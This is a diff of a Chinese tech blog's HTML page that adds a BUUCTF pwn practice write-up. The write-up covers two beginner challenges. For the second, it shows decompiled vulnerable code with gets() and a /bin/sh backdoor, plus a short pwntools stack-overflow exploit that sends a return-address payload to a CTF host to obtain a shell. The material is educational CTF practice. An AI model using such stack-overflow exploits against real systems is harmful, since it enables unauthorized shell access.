@@ -1,11 +1,10 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>haoo&#39;s tech blog - Status</title>
-<meta name="description" content="短记录、思路碎片和学习轨迹。">
+<title>haoo&#39;s tech blog - BUUCTF_pwn靶场练习</title>
+<meta name="description" content="test_your_ncint __fastcall main(int argc, const char **argv, const char **envp)&amp;#123; system(&amp;quot;/bin/sh&amp;quot;); return 0;&amp;#125; 一道简答的签到题目，直接nc连接就可以获得shell。 r">
 <meta name="theme-color" content="#090c0b">
 <meta name="color-scheme" content="dark">
 <script>
@@ -23,6 +22,7 @@
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="site-body">
+  
   <header class="site-header">
   <a class="skip-link" href="#main-content">跳到正文</a>
   <div class="site-header__inner">
@@ -73,128 +73,69 @@
 </header>
 
 
-  <main id="main-content" class="site-main">
-    <section class="page-hero">
-      <p class="section-kicker">status</p>
-      <h1>Status</h1>
-      
-        <p>短记录、思路碎片和学习轨迹。</p>
-      
-    </section>
-
-    <div class="layout-grid">
-      <section class="content-column">
-        <article class="content-panel article-prose">
-          <p>一些短记录、临时想法和训练进度可以放在这里。</p>
-<h2 id="Recent-Trace"><a href="#Recent-Trace" class="headerlink" title="Recent Trace"></a>Recent Trace</h2><ul>
-<li>新主题切到 <code>startrace</code>。</li>
-<li>首页、文章页、归档、标签、分类、友情链接都统一为技术笔记风格。</li>
-<li>下一步可以恢复真实文章源文件，或者继续定制评论系统。</li>
-</ul>
-
-        </article>
-      </section>
-
-      
-  
-  <aside class="sidebar">
-    
-      <section class="side-panel search-panel">
-        <h2 class="side-panel__title">检索</h2>
-        <label class="visually-hidden" for="search-input">搜索站内文章</label>
-        <input id="search-input" class="search-input" type="search" placeholder="搜索文章、题目或技术点" autocomplete="off" data-search-url="/search.json">
-        <div id="search-results" class="search-results" aria-live="polite"></div>
-      </section>
-    
-
-    
-      <section class="side-panel">
-        <h2 class="side-panel__title">最近更新</h2>
-        <div class="compact-list">
-          
-            <a href="/2026/08/14/ISCTF2024/">
-              <span>ISCTF2024</span>
-            </a>
-          
-            <a href="/2026/08/14/ISCTF2025/">
-              <span>ISCTF2025</span>
-            </a>
-          
-            <a href="/2026/08/14/BUUCTF-pwn%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
-              <span>BUUCTF_pwn靶场练习</span>
-            </a>
-          
-            <a href="/2026/08/14/NSSCTF-pwn%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
-              <span>NSSCTF_pwn靶场练习</span>
-            </a>
-          
-            <a href="/2026/07/22/pwn%20college_%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
-              <span>pwn college_靶场练习</span>
-            </a>
-          
+  <main id="main-content" class="site-main article-main">
+    <article class="article-wrap">
+      <header class="article-header">
+        <div class="post-meta">
+          <time datetime="2026-08-14">2026-08-14</time>
+          <span>约 2 分钟</span>
+          <span>995 字</span>
         </div>
-      </section>
-    
+        <h1>BUUCTF_pwn靶场练习</h1>
+        
+          <div class="tag-list">
+            
+              <a class="tag-chip tag-chip--solid" href="/categories/pwn/">pwn</a>
+            
+            
+              <a class="tag-chip" href="/tags/pwn/">pwn</a>
+            
+          </div>
+        
+      </header>
 
-    
-      <section class="side-panel">
-        <h2 class="side-panel__title">分类</h2>
-        <div class="compact-list compact-list--counts">
-          
-            <a href="/categories/pwn/">
-              <span>pwn</span>
-              <b>4</b>
-            </a>
-          
-            <a href="/categories/ctf/">
-              <span>ctf</span>
-              <b>2</b>
-            </a>
-          
+      <div class="article-grid">
+        <div class="article-body article-prose" id="article-content">
+          <h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int __fastcall main(int argc, const char **argv, const char **envp)<br>&#123;<br>  system(&quot;/bin/sh&quot;);<br>  return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>一道简答的签到题目，直接nc连接就可以获得shell。</p>
+<h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*] &#x27;/mnt/d/ctf/buuctf/rip&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        No PIE (0x400000)<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<p>一道64位的题目，几乎什么保护都没有开启，说明也是一道简单的签到题目，直接放入ida中进行分析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int __fastcall main(int argc, const char **argv, const char **envp)<br>&#123;<br>  char s[15]; // [rsp+1h] [rbp-Fh] BYREF<br><br>  puts(&quot;please input&quot;);<br>  gets(s, argv);<br>  puts(s);<br>  puts(&quot;ok,bye!!!&quot;);<br>  return 0;<br>&#125;<br>int fun()<br>&#123;<br>  return system(&quot;/bin/sh&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>存在明显的栈溢出以及后门函数，因此这道题的思路就是利用栈溢出修改返回地址到后门函数的地址即可获得shell。由于是64位，需要注意堆栈平衡，exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io = remote(&quot;9a7dcd5303871c963154af4f.tcp-ctf2.dasctf.com&quot;, 9999, ssl=True)<br><br>ret = 0x0000000000401016<br>fun = 0x401186<br>payload = cyclic(0xF + 8) + p64(ret) + p64(fun)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+
         </div>
-      </section>
-    
 
-    
-      <section class="side-panel">
-        <h2 class="side-panel__title">标签</h2>
-        <div class="tag-list">
-          
-            <a class="tag-chip" href="/tags/pwn/">pwn<small>4</small></a>
-          
-            <a class="tag-chip" href="/tags/ctf/">ctf<small>2</small></a>
-          
-        </div>
-      </section>
-    
+        
+          <aside class="toc-panel" aria-label="文章目录">
+            <div class="toc-panel__head">
+              <h2>目录</h2>
+              <button class="toc-top" type="button">顶部</button>
+            </div>
+            <nav id="toc"></nav>
+          </aside>
+        
+      </div>
 
-    
-      <section class="side-panel">
-        <h2 class="side-panel__title">常用链接</h2>
-        <div class="compact-list">
-          
-            <a href="https://github.com/star492" target="_blank" rel="noopener noreferrer">
-              <span>GitHub</span>
-              <b aria-hidden="true">-&gt;</b>
-            </a>
-          
-            <a href="https://pwn.college" target="_blank" rel="noopener noreferrer">
-              <span>pwn.college</span>
-              <b aria-hidden="true">-&gt;</b>
-            </a>
-          
-            <a href="https://www.exploit-db.com" target="_blank" rel="noopener noreferrer">
-              <span>Exploit-DB</span>
-              <b aria-hidden="true">-&gt;</b>
-            </a>
-          
-        </div>
-      </section>
-    
-  </aside>
-
-
-    </div>
+      <nav class="article-nav" aria-label="文章导航">
+        
+          <a href="/2026/08/14/ISCTF2025/">
+            <span>上一篇</span>
+            <strong>ISCTF2025</strong>
+          </a>
+        
+        
+          <a href="/2026/08/14/NSSCTF-pwn%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
+            <span>下一篇</span>
+            <strong>NSSCTF_pwn靶场练习</strong>
+          </a>
+        
+      </nav>
+    </article>
   </main>
 
   <footer class="site-footer">
@@ -241,4 +182,3 @@
 
 </body>
 </html>
-
